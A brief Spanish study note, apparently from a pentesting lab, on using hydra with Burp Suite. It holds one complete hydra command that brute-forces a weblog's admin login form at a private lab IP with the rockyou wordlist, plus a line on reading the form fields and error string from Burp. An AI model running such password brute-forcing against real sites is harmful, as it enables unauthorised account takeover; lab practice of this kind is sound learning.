# hydra junto con burpsuite

Creadas: 7 de diciembre de 2025 16:38

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.55 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -t 64 -F

lo que esta entre comillas en el mensaje de error y del user y pass que se ve en burpsuite